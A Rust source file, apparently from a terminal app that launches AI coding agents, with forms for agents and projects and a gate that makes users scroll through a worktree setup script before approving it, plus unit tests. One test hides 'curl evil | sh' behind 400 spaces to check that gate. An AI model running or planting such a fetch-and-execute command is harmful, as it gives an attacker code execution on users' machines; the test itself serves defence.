use std::path::{Path, PathBuf};

use protocol::{AgentKind, CreateAgent, ProjectId, Request, WorktreeRequest};
use ratatui::crossterm::event::{KeyCode, KeyEvent, KeyModifiers};

use crate::approved;
use crate::config::PresetDef;
use crate::known::{self, KnownProject};
use crate::layout::SetupLayout;
use crate::project_config;

use super::popup::{Edit, edit};
use super::{App, DEFAULT_SIZE, Effect, PendingCreate, Popup, wrap};

/// `Configured(i)` is the i-th preset from the config file; they follow the built-ins.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub enum Preset {
    #[default]
    Claude,
    Shell,
    Custom,
    Configured(usize),
}

const BUILTIN_PRESETS: [Preset; 3] = [Preset::Claude, Preset::Shell, Preset::Custom];

impl Preset {
    pub fn all(configured: usize) -> Vec<Preset> {
        BUILTIN_PRESETS
            .into_iter()
            .chain((0..configured).map(Preset::Configured))
            .collect()
    }

    pub fn label(self, presets: &[PresetDef]) -> &str {
        match self {
            Preset::Claude => "claude",
            Preset::Shell => "shell",
            Preset::Custom => "custom",
            Preset::Configured(index) => presets.get(index).map_or("?", |p| p.name.as_str()),
        }
    }

    pub fn next(self, configured: usize) -> Self {
        self.step(1, configured)
    }

    pub fn previous(self, configured: usize) -> Self {
        self.step(-1, configured)
    }

    fn step(self, step: i32, configured: usize) -> Self {
        let all = Preset::all(configured);
        let index = all.iter().position(|p| *p == self).unwrap_or(0);
        all[wrap(index, step, all.len())]
    }
}

#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub enum Field {
    #[default]
    Name,
    Preset,
    Command,
    Worktree,
    Base,
    Prompt,
}

/// Where a form stands with the daemon: being filled in, waiting for the reply to the request
/// it sent, or refused with the daemon's error, which it shows until it is sent again.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub enum Submission {
    #[default]
    Editing,
    Sending(Box<Request>),
    Failed(String),
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct NewAgentForm {
    pub name: String,
    pub preset: Preset,
    pub command: String,
    pub worktree: bool,
    pub base: String,
    pub prompt: String,
    pub field: Field,
    pub submission: Submission,
    /// The project is not in a git repository, so the agent cannot have a worktree.
    pub outside_git: bool,
}

/// A run of whitespace, with any dashes touching it, becomes one dash; dashes typed without
/// whitespace stay as typed. Leading and trailing dashes are dropped.
pub(super) fn normalize_name(input: &str) -> String {
    let separator = |c: char| c.is_whitespace() || c == '-';
    let mut out = String::new();
    let mut rest = input;
    while !rest.is_empty() {
        let split = rest.find(separator).unwrap_or(rest.len());
        out.push_str(&rest[..split]);
        rest = &rest[split..];
        let end = rest.find(|c| !separator(c)).unwrap_or(rest.len());
        let run = &rest[..end];
        out.push_str(if run.contains(char::is_whitespace) {
            "-"
        } else {
            run
        });
        rest = &rest[end..];
    }
    out.trim_matches('-').to_string()
}

impl NewAgentForm {
    pub fn fields(&self) -> Vec<Field> {
        let mut fields = vec![Field::Name, Field::Preset];
        if self.preset == Preset::Custom {
            fields.push(Field::Command);
        }
        if !self.outside_git {
            fields.push(Field::Worktree);
        }
        if self.worktree {
            fields.push(Field::Base);
        }
        fields.push(Field::Prompt);
        fields
    }

    fn step_field(&mut self, step: i32) {
        let fields = self.fields();
        let index = fields.iter().position(|f| *f == self.field).unwrap_or(0);
        self.field = fields[wrap(index, step, fields.len())];
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ProjectField {
    Path,
    Name,
}

/// An empty name leaves it to the daemon, which names the project after its directory.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ProjectForm {
    pub path: String,
    pub name: String,
    pub field: ProjectField,
    pub submission: Submission,
}

impl ProjectForm {
    pub(super) fn focused(&mut self) -> &mut String {
        match self.field {
            ProjectField::Path => &mut self.path,
            ProjectField::Name => &mut self.name,
        }
    }
}

impl App {
    /// The heading of the popup that asks to run `project`'s worktree setup script.
    pub fn setup_heading(&self, project: &Path) -> String {
        format!(
            "{}/{} runs this in every new worktree:",
            self.display_path(project),
            project_config::FILE
        )
    }

    /// How far the setup script can scroll and how many rows a page moves, in the popup
    /// `Popup::ApproveSetup` draws on `screen`; `None` when the screen is too small to show it.
    fn setup_scroll_limits(
        &self,
        project: &Path,
        script: &str,
        screen: (u16, u16),
    ) -> Option<(usize, usize)> {
        let layout = SetupLayout::new(&self.setup_heading(project), script, screen);
        layout.fits.then(|| (layout.max_scroll(), layout.rows))
    }

    /// Known projects that are not in the sidebar.
    pub fn project_candidates(&self) -> Vec<&KnownProject> {
        self.known
            .iter()
            .filter(|k| !self.projects.iter().any(|p| p.path == k.path))
            .collect()
    }

    pub(super) fn project_form(&self) -> Popup {
        Popup::AddProject(ProjectForm {
            path: self.cwd.display().to_string(),
            name: String::new(),
            field: ProjectField::Path,
            submission: Submission::Editing,
        })
    }

    pub(super) fn on_picker_key(&mut self, index: usize, key: &KeyEvent) -> Vec<Effect> {
        let rows = self.project_candidates().len() + 1;
        let picked = index
            .checked_sub(1)
            .and_then(|i| self.project_candidates().get(i).map(|k| (*k).clone()));
        let index = match key.code {
            KeyCode::Esc | KeyCode::Char('q') => return Vec::new(),
            KeyCode::Enter => {
                return match picked {
                    Some(project) => vec![Effect::Send(Request::AddProject {
                        path: project.path,
                        name: Some(project.name),
                    })],
                    None => {
                        self.popup = Some(self.project_form());
                        Vec::new()
                    }
                };
            }
            KeyCode::Char('j') | KeyCode::Down => wrap(index, 1, rows),
            KeyCode::Char('k') | KeyCode::Up => wrap(index, -1, rows),
            KeyCode::Char('x') => match picked {
                Some(project) => {
                    known::forget(&mut self.known, &project.path);
                    self.popup = Some(Popup::ProjectPicker {
                        index: index.min(rows - 2),
                    });
                    return vec![Effect::ForgetProject(project.path)];
                }
                None => index,
            },
            _ => index,
        };
        self.popup = Some(Popup::ProjectPicker { index });
        Vec::new()
    }

    pub(super) fn on_project_form_key(
        &mut self,
        mut form: ProjectForm,
        key: &KeyEvent,
    ) -> Vec<Effect> {
        match key.code {
            KeyCode::Tab | KeyCode::BackTab | KeyCode::Down | KeyCode::Up => {
                form.field = match form.field {
                    ProjectField::Path => ProjectField::Name,
                    ProjectField::Name => ProjectField::Path,
                };
            }
            _ => match edit(form.focused(), key) {
                Edit::Submit => {
                    let name = form.name.trim();
                    let request = Request::AddProject {
                        path: self.project_path(form.path.trim()),
                        name: (!name.is_empty()).then(|| name.to_string()),
                    };
                    form.submission = Submission::Sending(Box::new(request.clone()));
                    self.popup = Some(Popup::AddProject(form));
                    return vec![Effect::Send(request)];
                }
                Edit::Cancel => return Vec::new(),
                Edit::Continue => {}
            },
        }
        self.popup = Some(Popup::AddProject(form));
        Vec::new()
    }

    fn project_path(&self, input: &str) -> PathBuf {
        let home = self.home.as_ref();
        match (input, input.strip_prefix("~/"), home) {
            ("~", _, Some(home)) => home.clone(),
            (_, Some(rest), Some(home)) => home.join(rest),
            _ => self.cwd.join(input),
        }
    }

    pub(super) fn on_form_key(&mut self, mut form: NewAgentForm, key: KeyEvent) -> Vec<Effect> {
        match key.code {
            KeyCode::Esc => return Vec::new(),
            KeyCode::Enter => return self.submit_form(form),
            KeyCode::Tab | KeyCode::Down => form.step_field(1),
            KeyCode::BackTab | KeyCode::Up => form.step_field(-1),
            KeyCode::Left if form.field == Field::Preset => {
                form.preset = form.preset.previous(self.presets.len())
            }
            KeyCode::Right | KeyCode::Char(' ') if form.field == Field::Preset => {
                form.preset = form.preset.next(self.presets.len())
            }
            KeyCode::Left | KeyCode::Right | KeyCode::Char(' ')
                if form.field == Field::Worktree =>
            {
                form.worktree = !form.worktree
            }
            _ => {
                let target = match form.field {
                    Field::Name => Some(&mut form.name),
                    Field::Command => Some(&mut form.command),
                    Field::Base => Some(&mut form.base),
                    Field::Prompt => Some(&mut form.prompt),
                    Field::Preset | Field::Worktree => None,
                };
                if let Some(target) = target {
                    edit(target, &key);
                }
            }
        }
        self.popup = Some(Popup::NewAgent(form));
        Vec::new()
    }

    /// `<preset>-<n>` with the lowest `n` that no agent in the project uses.
    fn free_name(&self, project: ProjectId, preset: Preset) -> String {
        self.free_name_from(project, preset.label(&self.presets))
    }

    pub(super) fn free_name_from(&self, project: ProjectId, base: &str) -> String {
        let base = normalize_name(base);
        let base = if base.is_empty() { "agent" } else { &base };
        let taken = |name: &str| {
            self.agents
                .iter()
                .any(|a| a.project == project && a.name == name)
        };
        (1..)
            .map(|n| format!("{base}-{n}"))
            .find(|name| !taken(name))
            .expect("some number is free")
    }

    fn submit_form(&mut self, form: NewAgentForm) -> Vec<Effect> {
        let Some(project) = self.selected_project().map(|p| p.id) else {
            return Vec::new();
        };
        let name = match normalize_name(&form.name) {
            name if name.is_empty() => self.free_name(project, form.preset),
            name => name,
        };
        let (kind, command) = match form.preset {
            Preset::Claude => (AgentKind::Claude, Vec::new()),
            Preset::Shell => (AgentKind::Generic, vec![self.shell.clone()]),
            Preset::Custom => {
                let command = form.command.trim().to_string();
                if command.is_empty() {
                    let mut form = form;
                    form.submission = Submission::Failed("enter a command".into());
                    self.popup = Some(Popup::NewAgent(form));
                    return Vec::new();
                }
                (AgentKind::Generic, vec!["sh".into(), "-c".into(), command])
            }
            Preset::Configured(index) => match self.presets.get(index) {
                Some(preset) => (preset.kind, preset.command.clone()),
                None => return Vec::new(),
            },
        };
        let worktree = form.worktree.then(|| {
            let base = form.base.trim();
            WorktreeRequest {
                base: (!base.is_empty()).then(|| base.to_string()),
            }
        });
        let prompt = form.prompt.trim();
        let prompt = (!prompt.is_empty()).then(|| prompt.to_string());
        let (cols, rows) = self.pane_size.unwrap_or(DEFAULT_SIZE);
        let mut create = CreateAgent {
            project,
            name,
            kind,
            command,
            cols,
            rows,
            worktree,
            prompt,
            setup: None,
        };
        let project_path = self
            .projects
            .iter()
            .find(|p| p.id == project)
            .map(|p| p.path.clone());
        if let (Some(_), Some(path)) = (&create.worktree, project_path) {
            match project_config::worktree_setup(&path) {
                Err(error) => {
                    let mut form = form;
                    form.submission = Submission::Failed(error);
                    self.popup = Some(Popup::NewAgent(form));
                    return Vec::new();
                }
                Ok(Some(script))
                    if approved::is_approved(&self.approved_setups, &path, &script) =>
                {
                    create.setup = Some(script);
                }
                Ok(Some(script)) => {
                    self.popup = Some(Popup::ApproveSetup {
                        form: Box::new(form),
                        create: Box::new(create),
                        project: path,
                        script,
                        scroll: 0,
                    });
                    return Vec::new();
                }
                Ok(None) => {}
            }
        }
        self.send_create(form, create)
    }

    fn send_create(&mut self, mut form: NewAgentForm, create: CreateAgent) -> Vec<Effect> {
        self.pending_select = Some(PendingCreate {
            project: create.project,
            name: create.name.clone(),
            interactions: self.interactions,
        });
        let request = Request::CreateAgent(create);
        form.submission = Submission::Sending(Box::new(request.clone()));
        self.popup = Some(Popup::NewAgent(form));
        vec![Effect::Send(request)]
    }

    /// `y` runs the script and remembers it for the project, `s` creates the agent without
    /// it, `n` creates nothing. `y` waits until the script has been scrolled to its last row
    /// on a screen big enough to show it; `s` and `n` need nothing from the script, and the
    /// other keys scroll.
    pub(super) fn on_approve_setup_key(
        &mut self,
        form: Box<NewAgentForm>,
        mut create: Box<CreateAgent>,
        project: PathBuf,
        script: String,
        scroll: usize,
        key: KeyEvent,
    ) -> Vec<Effect> {
        let screen = self.screen_size.unwrap_or(DEFAULT_SIZE);
        let limits = self.setup_scroll_limits(&project, &script, screen);
        let (last, page) = limits.unwrap_or((0, 1));
        let ctrl = key.modifiers.contains(KeyModifiers::CONTROL);
        let scroll = match (key.code, ctrl) {
            (KeyCode::Char('n') | KeyCode::Esc, false) => return Vec::new(),
            (KeyCode::Char('s'), false) => return self.send_create(*form, *create),
            (KeyCode::Char('y'), false) if limits.is_some() && scroll >= last => {
                approved::approve(&mut self.approved_setups, &project, &script);
                create.setup = Some(script.clone());
                let mut effects = vec![Effect::ApproveSetup { project, script }];
                effects.extend(self.send_create(*form, *create));
                return effects;
            }
            (KeyCode::Char('j') | KeyCode::Down, false) => scroll + 1,
            (KeyCode::Char('k') | KeyCode::Up, false) => scroll.saturating_sub(1),
            (KeyCode::Char('d'), true) | (KeyCode::PageDown, _) => scroll + page.div_ceil(2),
            (KeyCode::Char('u'), true) | (KeyCode::PageUp, _) => {
                scroll.saturating_sub(page.div_ceil(2))
            }
            (KeyCode::Char('g'), false) => 0,
            (KeyCode::Char('G'), false) => last,
            _ => scroll,
        };
        self.popup = Some(Popup::ApproveSetup {
            form,
            create,
            project,
            script,
            scroll: scroll.min(last),
        });
        Vec::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::app::tests::{
        agent, code, configured, created, ctrl, form, key, known_of, loaded, loaded_with, project,
        submission, two_agents, type_text, with_known_old,
    };
    use protocol::Status;

    #[test]
    fn normalize_name_turns_whitespace_into_single_dashes() {
        for (input, expected) in [
            ("a - b", "a-b"),
            ("a  b", "a-b"),
            ("a -- b", "a-b"),
            ("a--b", "a--b"),
            ("a\tb", "a-b"),
            ("  my  new agent ", "my-new-agent"),
            (" -x- ", "x"),
            ("", ""),
            ("   ", ""),
            ("plain", "plain"),
        ] {
            assert_eq!(normalize_name(input), expected, "input {input:?}");
        }
    }

    #[test]
    fn form_submit_normalizes_the_name() {
        let (mut app, _, _) = two_agents();
        let _ = app.on_key(key('n'));
        type_text(&mut app, " my  new agent ");
        let c = created(app.on_key(code(KeyCode::Enter)));
        assert_eq!(c.name, "my-new-agent");
    }

    #[test]
    fn number_keys_are_text_in_the_new_agent_name_field() {
        let (mut app, _, _) = two_agents();
        let _ = app.on_key(key('n'));
        let _ = app.on_key(key('1'));
        let _ = app.on_key(key('2'));
        assert_eq!(form(&app).name, "12");
    }

    #[test]
    fn add_project_resolves_against_the_cwd() {
        let (mut app, _, _) = two_agents();
        let _ = app.on_key(key('a'));
        let _ = app.on_key(ctrl('u'));
        type_text(&mut app, "repo");
        assert_eq!(
            app.on_key(code(KeyCode::Enter)),
            vec![Effect::Send(Request::AddProject {
                path: "/work/repo".into(),
                name: None
            })]
        );
    }

    #[test]
    fn add_project_expands_a_leading_tilde() {
        for (typed, expected) in [
            ("~", "/home/u"),
            ("~/repo", "/home/u/repo"),
            ("x~", "/work/x~"),
            ("~other/repo", "/work/~other/repo"),
        ] {
            let (mut app, _, _) = two_agents();
            let _ = app.on_key(key('a'));
            let _ = app.on_key(ctrl('u'));
            type_text(&mut app, typed);
            assert_eq!(
                app.on_key(code(KeyCode::Enter)),
                vec![Effect::Send(Request::AddProject {
                    path: expected.into(),
                    name: None
                })],
                "{typed}"
            );
        }
    }

    #[test]
    fn add_opens_the_form_when_no_other_project_is_known() {
        let (mut app, _, _) = two_agents();
        let _ = app.on_key(key('a'));
        assert_eq!(
            app.popup,
            Some(Popup::AddProject(ProjectForm {
                path: "/work".into(),
                name: String::new(),
                field: ProjectField::Path,
                submission: Submission::Editing,
            }))
        );
    }

    #[test]
    fn add_opens_the_picker_on_new_project() {
        let (mut app, _, old) = with_known_old();
        let _ = app.on_key(key('a'));
        assert_eq!(app.popup, Some(Popup::ProjectPicker { index: 0 }));
        assert_eq!(app.project_candidates(), vec![&old]);
        let _ = app.on_key(code(KeyCode::Enter));
        assert!(
            matches!(&app.popup, Some(Popup::AddProject(form)) if form.path == "/work"),
            "{:?}",
            app.popup
        );
    }

    #[test]
    fn picker_adds_a_known_project_with_its_name() {
        let (mut app, _, old) = with_known_old();
        let _ = app.on_key(key('a'));
        let _ = app.on_key(key('j'));
        assert_eq!(app.popup, Some(Popup::ProjectPicker { index: 1 }));
        assert_eq!(
            app.on_key(code(KeyCode::Enter)),
            vec![Effect::Send(Request::AddProject {
                path: old.path,
                name: Some(old.name),
            })]
        );
        assert_eq!(app.popup, None);
    }

    #[test]
    fn picker_moves_with_wrapping_and_closes_on_esc() {
        let (mut app, _, _) = with_known_old();
        let _ = app.on_key(key('a'));
        let _ = app.on_key(key('k'));
        assert_eq!(app.popup, Some(Popup::ProjectPicker { index: 1 }));
        let _ = app.on_key(code(KeyCode::Down));
        assert_eq!(app.popup, Some(Popup::ProjectPicker { index: 0 }));
        let _ = app.on_key(code(KeyCode::Esc));
        assert_eq!(app.popup, None);
    }

    #[test]
    fn x_in_the_picker_forgets_the_highlighted_project() {
        let (mut app, p, old) = with_known_old();
        let _ = app.on_key(key('a'));
        assert!(app.on_key(key('x')).is_empty());
        assert_eq!(app.known.len(), 2);
        let _ = app.on_key(key('j'));
        assert_eq!(app.on_key(key('x')), vec![Effect::ForgetProject(old.path)]);
        assert_eq!(app.known, vec![known_of(&p)]);
        assert_eq!(app.popup, Some(Popup::ProjectPicker { index: 0 }));
    }

    #[test]
    fn project_form_sends_the_name_and_path() {
        let (mut app, _, _) = two_agents();
        let _ = app.on_key(key('a'));
        let _ = app.on_key(ctrl('u'));
        type_text(&mut app, "~/repo");
        let _ = app.on_key(code(KeyCode::Tab));
        type_text(&mut app, " My repo ");
        assert_eq!(
            app.on_key(code(KeyCode::Enter)),
            vec![Effect::Send(Request::AddProject {
                path: "/home/u/repo".into(),
                name: Some("My repo".into()),
            })]
        );
    }

    #[test]
    fn new_agent_form_creates_each_preset() {
        let (mut app, _, _) = two_agents();
        let _ = app.on_key(key('n'));
        type_text(&mut app, "api");
        let c = created(app.on_key(code(KeyCode::Enter)));
        assert_eq!(
            (c.name.as_str(), c.kind, c.command),
            ("api", AgentKind::Claude, Vec::<String>::new())
        );
        assert_eq!((c.cols, c.rows), (120, 40));

        let (mut app, _, _) = two_agents();
        let _ = app.on_key(key('n'));
        type_text(&mut app, "sh1");
        let _ = app.on_key(code(KeyCode::Tab));
        let _ = app.on_key(code(KeyCode::Right));
        let c = created(app.on_key(code(KeyCode::Enter)));
        assert_eq!(
            (c.kind, c.command),
            (AgentKind::Generic, vec!["/bin/sh".to_string()])
        );

        let (mut app, _, _) = two_agents();
        let _ = app.on_key(key('n'));
        type_text(&mut app, "job");
        let _ = app.on_key(code(KeyCode::Tab));
        let _ = app.on_key(code(KeyCode::Right));
        let _ = app.on_key(code(KeyCode::Right));
        let _ = app.on_key(code(KeyCode::Tab));
        type_text(&mut app, "make test");
        let c = created(app.on_key(code(KeyCode::Enter)));
        assert_eq!(
            (c.kind, c.command),
            (
                AgentKind::Generic,
                vec!["sh".to_string(), "-c".to_string(), "make test".to_string()]
            )
        );
    }

    #[test]
    fn custom_preset_creates_with_its_command() {
        let config = configured(
            r#"
            [[presets]]
            name = "codex"
            command = ["codex", "--full-auto"]
            "#,
        );
        let (mut app, _) = loaded_with(config, vec![project("p")], vec![]);
        let _ = app.on_key(key('n'));
        type_text(&mut app, "cx");
        let _ = app.on_key(code(KeyCode::Tab));
        let preset = |app: &App| match &app.popup {
            Some(Popup::NewAgent(form)) => form.preset,
            other => panic!("no form: {other:?}"),
        };
        let _ = app.on_key(code(KeyCode::Left));
        assert_eq!(preset(&app), Preset::Configured(0));
        let _ = app.on_key(code(KeyCode::Right));
        assert_eq!(preset(&app), Preset::Claude);
        for _ in 0..3 {
            let _ = app.on_key(code(KeyCode::Right));
        }
        assert_eq!(preset(&app), Preset::Configured(0));
        let c = created(app.on_key(code(KeyCode::Enter)));
        assert_eq!(
            (c.name.as_str(), c.kind, c.command),
            (
                "cx",
                AgentKind::Generic,
                vec!["codex".to_string(), "--full-auto".to_string()]
            )
        );
    }

    #[test]
    fn an_empty_name_takes_the_next_free_number_for_the_preset() {
        let (p, q) = (project("p"), project("q"));
        let agents = vec![
            agent(&p, "claude-1", Status::Idle),
            agent(&p, "claude-3", Status::Idle),
            agent(&q, "claude-2", Status::Idle),
        ];
        let (mut app, _) = loaded(vec![p, q], agents);
        let _ = app.on_key(key('n'));
        assert_eq!(created(app.on_key(code(KeyCode::Enter))).name, "claude-2");
        let _ = app.on_key(code(KeyCode::Esc));

        let _ = app.on_key(key('n'));
        type_text(&mut app, "   ");
        let _ = app.on_key(code(KeyCode::Tab));
        let _ = app.on_key(code(KeyCode::Right));
        assert_eq!(created(app.on_key(code(KeyCode::Enter))).name, "shell-1");
    }

    #[test]
    fn new_agent_without_projects_says_so() {
        let (mut app, _) = loaded(vec![], vec![]);
        assert!(app.on_key(key('n')).is_empty());
        assert_eq!(app.popup, None);
        assert_eq!(
            app.message.as_ref().map(|m| m.text.as_str()),
            Some("add a project first (a)")
        );
    }

    #[test]
    fn a_custom_preset_without_a_command_says_so_in_the_form() {
        let (mut app, _, _) = two_agents();
        let _ = app.on_key(key('n'));
        let _ = app.on_key(code(KeyCode::Tab));
        let _ = app.on_key(code(KeyCode::Left));
        assert_eq!(form(&app).preset, Preset::Custom);
        assert!(app.on_key(code(KeyCode::Enter)).is_empty());
        assert_eq!(
            submission(&app),
            Submission::Failed("enter a command".into())
        );
        assert_eq!(app.message, None);
    }

    #[test]
    fn form_worktree_toggle_and_base_field() {
        let (mut app, _, _) = two_agents();
        let _ = app.on_key(key('n'));
        let mut order = vec![form(&app).field];
        for _ in 0..3 {
            let _ = app.on_key(code(KeyCode::Tab));
            order.push(form(&app).field);
        }
        assert_eq!(
            order,
            [Field::Name, Field::Preset, Field::Worktree, Field::Prompt]
        );
        let _ = app.on_key(code(KeyCode::BackTab));
        assert_eq!(form(&app).field, Field::Worktree);
        for (event, on) in [
            (key(' '), true),
            (code(KeyCode::Left), false),
            (code(KeyCode::Right), true),
        ] {
            let _ = app.on_key(event);
            assert_eq!(form(&app).worktree, on, "{event:?}");
        }
        let _ = app.on_key(key('j'));
        assert!(form(&app).worktree);
        let _ = app.on_key(code(KeyCode::Tab));
        assert_eq!(form(&app).field, Field::Base);
        type_text(&mut app, "dev");
        let _ = app.on_paste("-x\nignored".into());
        assert_eq!(form(&app).base, "dev-x");
        let _ = app.on_key(code(KeyCode::Tab));
        assert_eq!(form(&app).field, Field::Prompt);
        let _ = app.on_key(code(KeyCode::BackTab));
        assert_eq!(form(&app).field, Field::Base);

        let _ = app.on_key(code(KeyCode::Up));
        let _ = app.on_key(code(KeyCode::Up));
        assert_eq!(form(&app).field, Field::Preset);
        let _ = app.on_key(code(KeyCode::Left));
        assert_eq!(form(&app).preset, Preset::Custom);
        let mut order = vec![form(&app).field];
        for _ in 0..5 {
            let _ = app.on_key(code(KeyCode::Down));
            order.push(form(&app).field);
        }
        assert_eq!(
            order,
            [
                Field::Preset,
                Field::Command,
                Field::Worktree,
                Field::Base,
                Field::Prompt,
                Field::Name
            ]
        );
    }

    #[test]
    fn form_sends_worktree_request_when_on() {
        let (mut app, _, _) = two_agents();
        let _ = app.on_key(key('n'));
        type_text(&mut app, "wt");
        let _ = app.on_key(code(KeyCode::Tab));
        let _ = app.on_key(code(KeyCode::Right));
        let _ = app.on_key(code(KeyCode::Tab));
        let _ = app.on_key(key(' '));
        let c = created(app.on_key(code(KeyCode::Enter)));
        assert_eq!(
            (c.kind, c.worktree),
            (
                AgentKind::Generic,
                Some(protocol::WorktreeRequest { base: None })
            )
        );

        for (typed, base) in [(" dev ", Some("dev".to_string())), ("  ", None)] {
            let (mut app, _, _) = two_agents();
            let _ = app.on_key(key('n'));
            type_text(&mut app, "wt");
            let _ = app.on_key(code(KeyCode::Up));
            let _ = app.on_key(code(KeyCode::Up));
            let _ = app.on_key(key(' '));
            let _ = app.on_key(code(KeyCode::Down));
            type_text(&mut app, typed);
            let c = created(app.on_key(code(KeyCode::Enter)));
            assert_eq!(c.worktree, Some(protocol::WorktreeRequest { base }));
        }
    }

    #[test]
    fn form_sends_the_prompt() {
        let (mut app, _, _) = two_agents();
        let _ = app.on_key(key('n'));
        let _ = app.on_key(code(KeyCode::Up));
        assert_eq!(form(&app).field, Field::Prompt);
        type_text(&mut app, "fix it");
        let _ = app.on_paste(" in\nparser.rs\r\n".into());
        let c = created(app.on_key(code(KeyCode::Enter)));
        assert_eq!(c.prompt.as_deref(), Some("fix it in parser.rs"));

        let (mut app, _, _) = two_agents();
        let _ = app.on_key(key('n'));
        let _ = app.on_key(code(KeyCode::Up));
        type_text(&mut app, "   ");
        let c = created(app.on_key(code(KeyCode::Enter)));
        assert_eq!(c.prompt, None);
    }

    #[test]
    fn form_worktree_is_off_by_default() {
        let (mut app, _, _) = two_agents();
        let _ = app.on_key(key('n'));
        assert!(!form(&app).worktree);
        assert_eq!(form(&app).base, "");
        type_text(&mut app, "api");
        let c = created(app.on_key(code(KeyCode::Enter)));
        assert_eq!(c.worktree, None);
    }

    #[test]
    fn a_project_outside_git_offers_no_worktree() {
        let (mut app, _, _) = two_agents();
        app.is_git_repo = |_| false;
        let _ = app.on_key(key('n'));
        assert!(form(&app).outside_git);
        let mut order = vec![form(&app).field];
        for _ in 0..3 {
            let _ = app.on_key(code(KeyCode::Tab));
            order.push(form(&app).field);
        }
        assert_eq!(
            order,
            [Field::Name, Field::Preset, Field::Prompt, Field::Name]
        );
    }
}

#[cfg(test)]
mod setup_tests {
    use super::*;
    use protocol::Project;

    fn key(c: char) -> KeyEvent {
        KeyEvent::new(KeyCode::Char(c), KeyModifiers::NONE)
    }

    fn code(code: KeyCode) -> KeyEvent {
        KeyEvent::new(code, KeyModifiers::NONE)
    }

    /// A loaded app whose one project is a real directory holding `.lazyagents.toml`.
    fn with_setup(script: &str) -> (App, tempfile::TempDir) {
        let dir = tempfile::tempdir().expect("project");
        std::fs::write(
            dir.path().join(".lazyagents.toml"),
            format!("[worktree]\nsetup = {script:?}\n"),
        )
        .expect("config");
        let project = Project {
            id: ProjectId::random(),
            name: "p".into(),
            path: dir.path().to_path_buf(),
        };
        let (app, _) = crate::app::tests::loaded(vec![project], Vec::new());
        (app, dir)
    }

    /// Opens the new agent form, turns on Worktree and submits.
    fn submit_worktree_agent(app: &mut App) -> Vec<Effect> {
        let _ = app.on_key(key('n'));
        let _ = app.on_key(code(KeyCode::Tab));
        let _ = app.on_key(code(KeyCode::Tab));
        let _ = app.on_key(key(' '));
        app.on_key(code(KeyCode::Enter))
    }

    fn created_setup(effects: &[Effect]) -> Option<Option<String>> {
        effects.iter().find_map(|effect| match effect {
            Effect::Send(Request::CreateAgent(create)) => Some(create.setup.clone()),
            _ => None,
        })
    }

    #[test]
    fn an_unapproved_setup_script_is_shown_before_it_runs() {
        let (mut app, dir) = with_setup("npm install");
        assert!(submit_worktree_agent(&mut app).is_empty());
        assert!(matches!(
            &app.popup,
            Some(Popup::ApproveSetup { script, .. }) if script == "npm install"
        ));
        let effects = app.on_key(key('y'));
        assert!(effects.contains(&Effect::ApproveSetup {
            project: dir.path().to_path_buf(),
            script: "npm install".into(),
        }));
        assert!(app.popup.as_ref().is_some_and(Popup::is_sending));
        assert_eq!(created_setup(&effects), Some(Some("npm install".into())));
    }

    #[test]
    fn an_approved_script_runs_without_asking_until_it_changes() {
        let (mut app, dir) = with_setup("npm install");
        app.approved_setups = vec![crate::approved::Approval {
            project: dir.path().to_path_buf(),
            script: "npm install".into(),
        }];
        let effects = submit_worktree_agent(&mut app);
        assert!(app.popup.as_ref().is_some_and(Popup::is_sending));
        assert_eq!(created_setup(&effects), Some(Some("npm install".into())));
        let _ = app.on_key(code(KeyCode::Esc));

        std::fs::write(
            dir.path().join(".lazyagents.toml"),
            "[worktree]\nsetup = \"npm install && ./postinstall.sh\"\n",
        )
        .expect("edit");
        assert!(submit_worktree_agent(&mut app).is_empty());
        assert!(matches!(app.popup, Some(Popup::ApproveSetup { .. })));
    }

    fn tall_script() -> String {
        (1..=40)
            .map(|n| format!("echo step {n}"))
            .collect::<Vec<_>>()
            .join("\n")
    }

    fn approve_scroll(app: &App) -> usize {
        match &app.popup {
            Some(Popup::ApproveSetup { scroll, .. }) => *scroll,
            other => panic!("not asking for approval: {other:?}"),
        }
    }

    #[test]
    fn a_script_taller_than_the_screen_cannot_be_approved_before_its_last_line_is_shown() {
        let (mut app, _dir) = with_setup(&tall_script());
        app.set_screen_size(60, 20);
        let _ = submit_worktree_agent(&mut app);

        assert!(app.on_key(key('y')).is_empty());
        assert!(matches!(app.popup, Some(Popup::ApproveSetup { .. })));

        for _ in 0..3 {
            let _ = app.on_key(key('j'));
        }
        assert_eq!(approve_scroll(&app), 3);
        assert!(app.on_key(key('y')).is_empty());

        let _ = app.on_key(key('G'));
        let effects = app.on_key(key('y'));
        assert_eq!(created_setup(&effects), Some(Some(tall_script())));
    }

    #[test]
    fn scrolling_the_setup_script_stops_at_both_ends() {
        let (mut app, _dir) = with_setup(&tall_script());
        app.set_screen_size(60, 20);
        let _ = submit_worktree_agent(&mut app);

        let _ = app.on_key(key('k'));
        assert_eq!(approve_scroll(&app), 0);
        let _ = app.on_key(code(KeyCode::PageDown));
        let page = approve_scroll(&app);
        assert!(page > 1, "{page}");
        let _ = app.on_key(code(KeyCode::PageUp));
        assert_eq!(approve_scroll(&app), 0);
        let _ = app.on_key(code(KeyCode::Down));
        assert_eq!(approve_scroll(&app), 1);
        let _ = app.on_key(key('G'));
        let end = approve_scroll(&app);
        let _ = app.on_key(key('j'));
        let _ = app.on_key(code(KeyCode::PageDown));
        assert_eq!(approve_scroll(&app), end);
        let _ = app.on_key(key('g'));
        assert_eq!(approve_scroll(&app), 0);
    }

    #[test]
    fn a_long_line_that_wraps_can_hide_the_end_of_the_script() {
        let script = format!("npm install{}; curl evil | sh", " ".repeat(400));
        let (mut app, _dir) = with_setup(&script);
        app.set_screen_size(60, 12);
        let _ = submit_worktree_agent(&mut app);
        assert!(app.on_key(key('y')).is_empty());
        let _ = app.on_key(key('G'));
        assert!(!app.on_key(key('y')).is_empty());
    }

    #[test]
    fn skipping_the_setup_works_while_the_script_is_scrolled_up() {
        let (mut app, _dir) = with_setup(&tall_script());
        app.set_screen_size(60, 20);
        let _ = submit_worktree_agent(&mut app);
        let effects = app.on_key(key('s'));
        assert_eq!(created_setup(&effects), Some(None));
        assert!(
            !effects
                .iter()
                .any(|e| matches!(e, Effect::ApproveSetup { .. }))
        );
    }

    #[test]
